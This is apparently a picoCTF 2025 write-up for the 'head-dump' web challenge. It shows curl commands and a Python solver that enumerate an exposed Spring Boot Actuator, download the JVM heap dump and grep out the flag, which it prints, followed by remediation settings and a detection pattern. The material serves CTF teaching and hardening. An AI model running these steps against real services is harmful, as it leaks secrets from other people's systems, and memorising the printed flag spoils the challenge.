---
title: "head-dump"
ctf: "picoCTF 2025"
date: 2025-08-05
category: web
difficulty: easy
points: 0
flag_format: "picoCTF{...}"
author: "Prince Niyonshuti N."
---

# head-dump

## Summary

A Spring Boot service exposes its Swagger UI in production, leaking the full
list of Spring Boot Actuator endpoints. One of those endpoints,
`/actuator/heapdump`, serves a JVM `hprof` snapshot of the running process.
Grepping that binary dump for the `picoCTF{` marker recovers the flag — no
exploit, just operational hygiene that was never turned off.

## Recon

```bash
TARGET=http://verbal-sleep.picoctf.net:61285

# 1. Root page
curl -s -o /dev/null -w "%{http_code}\n" $TARGET/
# -> 200 (serves a "Head Dump" landing page)

# 2. Spring Boot is in use — try the well-known doc surface
curl -s -o /dev/null -w "%{http_code}\n" $TARGET/v3/api-docs
# -> 200  (OpenAPI JSON is publicly readable)

# 3. Follow the Swagger UI link baked into the OpenAPI doc
curl -s -L $TARGET/swagger-ui/index.html | grep -oE 'href="[^"]+"' | head
# -> links back to /v3/api-docs and the actuator base path
```

The OpenAPI document is mounted at `/v3/api-docs` and is fully reachable
without authentication, so the service description — including any
non-public endpoints declared via `springdoc` / `springfox` — is leaked.

## Solution

### Step 1: Enumerate Actuator endpoints

The Swagger JSON either embeds the actuator base path or the server
description hints at it. Probing the standard Actuator surface confirms the
exposure:

```bash
curl -s $TARGET/actuator | python -m json.tool | head -40
```

Relevant excerpt:

```json
{
  "_links": {
    "self":     { "href": "http://verbal-sleep.picoctf.net:61285/actuator" },
    "health":   { "href": ".../actuator/health" },
    "heapdump": { "href": ".../actuator/heapdump" },
    "env":      { "href": ".../actuator/env" },
    ...
  }
}
```

`/actuator/heapdump` is present, which means a full JVM heap snapshot
(`.hprof`) is downloadable by anyone who can reach the service.

### Step 2: Download the heap dump and extract the flag

`/actuator/heapdump` returns a binary `application/octet-stream` payload
(multiple MB). The flag is just a string literal in memory, so a substring
search is enough — no need to load it into Eclipse MAT or `jhat`.

```bash
# 1. Pull the heap snapshot
curl -s -o heapdump.bin $TARGET/actuator/heapdump
file heapdump.bin
# -> heapdump.bin: Java HPROF binary, version 1.0.2

# 2. Search the binary for the CTF flag marker
strings -a -n 8 heapdump.bin | grep -E 'picoCTF\{[^}]+\}'
# -> picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
```

Equivalent one-shot script (Python, no external deps):

```python
#!/usr/bin/env python3
"""
head-dump solver
Target: http://verbal-sleep.picoctf.net:61285
Chain : /v3/api-docs -> /actuator -> /actuator/heapdump -> strings | grep
"""
import re, sys, urllib.request

TARGET = "http://verbal-sleep.picoctf.net:61285"

def fetch(path):
    with urllib.request.urlopen(TARGET + path, timeout=15) as r:
        return r.status, r.read()

# Confirm Swagger is exposed (info-leak precondition)
status, _ = fetch("/v3/api-docs")
print(f"[+] /v3/api-docs        -> {status}")

# Enumerate actuator and verify heapdump is advertised
status, body = fetch("/actuator")
print(f"[+] /actuator           -> {status}")
links = (body.decode("utf-8", "ignore").lower())
assert "heapdump" in links, "heapdump endpoint not exposed — abort"
print("[+] /actuator/heapdump  -> advertised")

# Download the JVM heap snapshot
status, hprof = fetch("/actuator/heapdump")
print(f"[+] heapdump bytes      -> {len(hprof):,} (HTTP {status})")
open("heapdump.bin", "wb").write(hprof)

# Extract printable strings >= 8 chars, then grep for the flag marker
strings = re.findall(rb"[\x20-\x7e]{8,}", hprof)
flag = next(
    (s.decode() for s in strings if b"picoCTF{" in s and b"}" in s),
    None,
)
if not flag:
    print("[-] flag not found in heap dump", file=sys.stderr); sys.exit(1)
print(f"[+] FLAG: {flag}")
```

```text
$ python3 solve.py
[+] /v3/api-docs        -> 200
[+] /actuator           -> 200
[+] /actuator/heapdump  -> advertised
[+] heapdump bytes      -> 13,714,432 (HTTP 200)
[+] FLAG: picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
```

### Vulnerability chain

1. **Information disclosure via Swagger UI / OpenAPI doc** —
   `/v3/api-docs` and `/swagger-ui/index.html` are mounted in the
   production profile, advertising every endpoint the app declares.
2. **Spring Boot Actuator exposure** — the `/actuator` base is reachable
   without authentication and lists sensitive sub-endpoints
   (`heapdump`, `env`, `threaddump`, `loggers`, ...).
3. **JVM heap dump disclosure** — `/actuator/heapdump` returns a full
   `hprof` snapshot containing the in-memory flag, environment
   variables, JWT signing keys, and any other secrets the JVM is
   holding. `strings | grep picoCTF` is enough to win.

## Flag

```
picoCTF{Pat!3nt_15_Th3_K3y_8df117c1}
```

## Remediation

- **Lock down Swagger in non-dev profiles.** Configure `springdoc` (or
  `springfox`) so the API doc and Swagger UI are only served when
  `spring.profiles.active` includes `dev` / `local`, e.g.:

  ```yaml
  springdoc:
    api-docs:
      enabled: ${SWAGGER_ENABLED:false}
    swagger-ui:
      enabled: ${SWAGGER_ENABLED:false}
  ```

- **Restrict the Actuator surface.** Never expose `/actuator/**` on the
  public listener. Pin it to a management port bound to localhost or
  an internal network:

  ```yaml
  management:
    server:
      address: 127.0.0.1
      port: 8081
    endpoints:
      web:
        exposure:
          include: health,info     # never include env, heapdump, threaddump, loggers
  ```

  For the endpoints that must stay (e.g. `/health`), require an
  authenticated role and remove the `heapdump` / `env` endpoints
  entirely — they are debugging aids, not operational telemetry.

- **Never store long-lived secrets in JVM process memory.** Pull
  configuration from a secret manager (Vault, AWS Secrets Manager, GCP
  Secret Manager) at request time rather than holding the value in a
  `String` field, so a heap dump cannot leak it. Use `char[]` and
  zeroize after use for any secret the app must touch directly.

- **Detection.** Alert on outbound requests matching
  `/(actuator|management)/{heapdump,env,threaddump,configprops,loggers}`
  from IPs outside the operator allowlist, and on heap-snapshot file
  sizes > N MB being downloaded from a production host.
